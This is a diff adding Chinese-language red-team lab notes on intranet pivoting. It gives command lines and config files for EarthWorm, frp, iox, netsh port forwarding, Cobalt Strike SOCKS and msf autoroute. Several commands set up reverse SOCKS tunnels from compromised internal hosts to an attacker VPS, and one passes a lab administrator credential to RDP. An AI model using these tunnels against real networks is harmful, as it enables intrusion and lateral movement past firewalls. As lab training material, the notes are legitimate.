@@ -44,3 +44,401 @@ vps客户端执行：
 直接通过socks4协议连接本机的50001端口即可(http隧道)。
 
 
+
+
+
+
+反向连接推荐：
+socks隧道：
+1.earthworm
+2.frp[强推]：部署在客户端和服务端，支持TCP、UDP、HTTP、HTTPS等多种协议。
+https://github.com/fatedier/frp
+3.goproxy：https://github.com/elazarl/goproxy
+应该是这个：https://github.com/snail007/goproxy/releases/tag/v11.7
+4.nps：https://github.com/ehang-io/nps
+
+其他：msf portfwd
+
+
+
+
+
+穿透类型：
+1.单层内网穿透(端口转发类型)：
+a1：跳板机能正常出网，且存在公网ip。
+则能正连、反连。
+工具：
+(1)socks隧道(推荐):
+z1. cs自带socks4
+右键cs的session->socks代理->proxy pivots->tunel->linux在/etc/proxychains4.conf中挂上代理，如：
+socks4 192.168.43.141 52647
+核心：就是走c2服务器的代理，通过c2将其转发到目标对应的网络(一般为某个局域网络)，第一台机器作为跳板机(类似代理服务器)。
+proxychains4 curl http://192.168.52.141:8099
+访问对应局域网内的某台机器成功。
+
+nmap扫描一般会注释掉proxy_dns,如此则dns不会走proxychains4代理，否则nmap的一些功能通过dns获取ip会失败。
+proxychains4 nmap -Pn -O -A -vv 192.168.52.1/24
+
+
+
+
+z2. earthworm：https://rootkiter.com/EarthWorm/ 		默认为socks5协议。
+cs上传ew.exe->
+
+ew在本机监听在10896端口：
+./ew -s ssocksd -l 10896
+ew出网走的另一个端口，必须允许对应的该端口出站才行。
+
+firefox挂代理：
+socks5 192.168.43.39 10896
+则能直接访问其所在局域网络的其他主机(如：http://192.168.52.143/8099)。
+
+proxychains4也同理。
+
+
+
+EW反弹SOCKS v5服务器：
+vps上监听在8816端口：将本地的8816的流量转到本地的1086端口。即目标访问0.0.0.0:8816的流量转到本机的1086端口。
+./ew -s rcsocks -l 1086 -e 8816
+
+目标机器反连vps的8816端口：
+./ew -s rssocks -d 192.168.43.141 -e 8816
+
+连接成功。
+firefox和proxychains4只需挂本机的1086端口代理即可，如：
+socks5 192.168.43.141 1086
+
+
+
+
+(2)https隧道
+earthworm：
+https://rootkiter.com/EarthWorm/
+https://github.com/idlefire/ew
+
+若目标A仅允许本机的80端口出网，且80端口已被本机的web服务占用，则一般只能使用对应的http(或https)隧道。
+
+
+
+
+#监听在UDP的3307端口：
+nc -u -lvp 3307
+
+#nc通过udp连接：使用-p指定本地使用50093端口去连接192.168.43.141的3307端口，且走的udp协议。
+nc -u -p 50093 192.168.43.141 3307
+
+
+
+
+
+
+
+端口转发：
+1. netsh：windows自带命令行工具。 
+端口转发过程：仅适用于tcp.  端口转发后，正反的流量都走该线路。
+192.168.204.150:3340-->192.168.204.150:3389
+命令：
+netsh interface portproxy add v4tov4 listenaddress=192.168.204.150 listenport=3340  connectaddress=192.168.204.150 connectport=3389
+
+
+查看已存在的端口转发：
+netsh interface portproxy show all
+netsh interface portproxy show v4tov4
+
+
+删除指定转发规则：
+netsh interface portproxy delete v4tov4 listenaddress=192.168.204.150 listenport=3340 
+
+
+
+eg1：
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8618 connectaddress=192.168.52.141  connectport=8099
+
+netsh interface portproxy show v4tov4
+
+直接访问：
+http://192.168.43.39:8618/
+成功。
+
+
+
+
+
+
+2. iox：流量加密、udp流量转发、反向代理模式中适用tcp多路复用。
+https://github.com/EddieIvan01/iox
+
+
+fwd转发模式:
+eg1：
+iox监听在0.0.0.0:8869，将流量转发到192.168.52.141:8099.
+./iox fwd -l 8869 -r 192.168.52.141:8099
+
+直接访问http://192.168.43.39:8869即可访问到http://192.168.52.141:8869.
+
+
+
+
+
+
+eg2：
+vps执行：顺序不能换。
+./iox fwd -l *1089 -l 8013 -k 655849
+目标主机A连接vps(B主机)的1089端口，使用时挂上vps(B主机)的8013端口的代理即可。
+
+被控主机执行：这里顺序无所谓。
+./iox fwd -r *192.168.43.141:1089 -r 192.168.52.141:3389 -k 655849
+
+eg1：转发内网的机器C的3389进行远程桌面连接。
+winxz：3389可以远程连接。
+192.168.52.141
+
+win7：跳板机
+192.168.43.39
+192.168.52.143
+
+kali：攻击机
+192.168.43.141
+
+
+上传iox.exe-->
+
+
+kali执行：注：监听的是127.0.0.1，故需使用127.0.0.1进行连接。
+./iox fwd -l *1089 -l 8013 -k 655849
+
+win7跳板机执行：
+iox.exe fwd -r 192.168.52.141:3389 -r *192.168.43.141:1089 -k 655849
+
+kali执行：
+rdesktop 127.0.0.1:8013 -u "god\administrator" -p "Qwe123456"
+连接成功。
+
+
+3. msf之portfwd
+
+
+
+
+
+4. frp：专注于反向代理。支持TCP、UDP、HTTP、HTTPS等多种协议。采用tcp连接流式复用、端口复用。
+https://github.com/fatedier/frp
+https://gofrp.org/docs/
+
+方式1：socks5隧道：eg1：
+(1)：服务端配置文件：
+-------------1s---------------
+[common]
+bind_addr=0.0.0.0
+bind_port=8014
+
+#可以不设置
+dashboard_addr=0.0.0.0
+
+#端口必须设置，只有设置了web页面才生效。
+dashboard_port=7500
+
+#登录密码：
+dashboard_user=suiujei
+dashboard_pwd=wkdkQmZkkqodw
+
+#允许客户端绑定的端口(即攻击者只能连接frps所在机器的该范围内的socks代理)：
+allow_ports=40000-50000
+token=trkwXmwqkUEkwzqz
+-------------1e-----------------
+
+
+运行：
+./frps -c frps.ini或
+nohub ./frps -c frps.ini
+
+nohub：即后台运行，退出终端也不影响其运行。
+
+
+登录web界面查看：
+http://127.0.0.1:7500
+dashboard_user=suiujei
+dashboard_pwd=wkdkQmZkkqodw
+
+
+(2)：客户端配置文件：
+-----------1s---------------
+[common]
+#远程vps连接地址：
+server_addr=192.168.43.141
+server_port=8014
+#加密设置为开启
+tls_enable=true
+#最多同时有5个代理
+pool_count=5
+#token需与服务器端的一致
+token=trkwXmwqkUEkwzqz
+
+[plugsbzin_sokcxzzks]
+type=tcp
+#端口必须在设置的范围内，即仅允许攻击者通过frps所在机器的46000端口进行socks代理连接。且使用对应的凭证。
+#plugin_user、plugin_passwd
+remote_port=46000
+plugin=socks5
+plugin_user=suijitetsz
+plugin_passwd=kwUHS758HSnqz
+#流量加密传输开启
+use_encryption=true
+#开启压缩
+use_compression=true
+--------------1e---------------
+
+
+运行：
+frpc.exe -c frpc.ini
+
+连接成功。挂上socks5代理(最好写127.0.0.1)即可访问内网。
+
+带账号密码的格式：
+协议://username:passwd@host:port
+eg1：
+socks5://userz:passwdz@16.34.65.38:496
+
+proxychains配置：
+socks5 192.168.43.68 8019
+socks5 192.168.43.69 8046 userz passwdz
+
+
+
+
+方式2：端口映射：eg1：
+(1)服务器端配置：
+-------------1s---------------
+[common]
+bind_addr=0.0.0.0
+bind_port=8016
+
+#可以不设置
+dashboard_addr=0.0.0.0
+
+#端口必须设置，只有设置了web页面才生效。
+dashboard_port=7501
+
+#登录密码：
+dashboard_user=suiujeq
+dashboard_pwd=wkdkQmZkkqode
+
+#允许客户端绑定的端口(即攻击者只能连接frps所在机器的该范围内的socks代理)：
+allow_ports=40006-50001
+token=trkwXmwqkUEkwzqw
+-------------1e-----------------
+
+
+
+(2)客户端配置文件：
+-----------1s---------------
+[common]
+#远程vps连接地址：
+server_addr=192.168.43.141
+server_port=8016
+#加密设置为开启
+tls_enable=true
+#最多同时有5个代理
+pool_count=5
+#token需与服务器端的一致
+token=trkwXmwqkUEkwzqw
+
+[plugswbzin_sokc_qxzwks]
+type=tcp
+#端口必须在设置的范围内，即仅允许攻击者通过frps所在机器的46000端口进行socks代理连接。且使用对应的凭证。
+#plugin_user、plugin_passwd
+remote_port=46005
+local_port=3389
+#流量加密传输开启
+use_encryption=true
+--------------1e---------------
+
+
+rdesktop 127.0.0.1:46005成功访问。
+
+
+
+代理工具：
+proxifier
+proxychains
+sockscap64
+
+
+
+
+
+多层内网穿透：
+1.msf：即自动添加路由，凡路由可达，msf就可达。
+run post/multi/manage/autoroute
+run autoroute -p
+2.termite
+3. ew
+eg1：二重网络环境： 
+环境配置：
+win7：
+192.168.43.39
+192.168.52.143
+
+winxz：
+192.168.52.141
+192.168.246.129
+
+winserver(域控)：
+192.168.52.138
+
+win10：final target.
+192.168.246.130
+
+kali(攻击机)：
+192.168.43.141
+
+
+正连：
+步骤：
+kali->WIN7->winxz->win10
+
+winxz执行：监听在本机的0.0.0.0:9968
+./ew -s ssocksd -l 9968
+
+
+win7执行：在本机的0.0.0.0:1093和目标的192.168.52.141:9968地址之间进行转发。
+./ew -s lcx_tran -l 1093 -f 192.168.52.141 -g 9968
+
+
+kali通过socks5协议访问192.168.43.39:1093即可直达目标内网。
+访问成功。
+
+
+
+
+
+反连：
+                  一台可控公网IP主机                    可控内网主机A         可访问指定资源的主机B
++---------+     +--------------------------+    |    +-----------------+      +-----------------+
+|HackTools| ->> | 1080 ->  1.1.1.1 -> 8888 |  防火墙  | <--  2.2.2.2 --> | ->> | 9999 -> 2.2.2.3 |
++---------+     +--------------------------+    |    +-----------------+      +-----------------+
+a)  ./ew -s lcx_listen -l 1080 -e 8888
+    // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求
+    // 转交给反连 8888 端口的主机
+b)  ./ew -s ssocksd -l 9999
+        // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理
+c)  ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
+        // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 2.2.2.3:9999 之间的通讯隧道
+d)  HackTools 可通过访问 1.1.1.1:1080 来使用 2.2.2.3 主机提供的 socks5 代理
+
+
+kali执行：socks5连接本机(127.0.0.1)的1035端口即可。
+./ew_for_linux64 -s lcx_listen -l 1035 -e 8694
+
+winxz执行：监听在本机的0.0.0.0:9935
+./ew -s ssocksd -l 9935
+
+
+win7执行：
+./ew -s lcx_slave -d 192.168.43.141 -e 8694 -f 192.168.52.141 -g 9935
+
+kali通过socks5协议访问127.0.0.1:1035即可直达目标内网。
+访问成功。
+
+
+
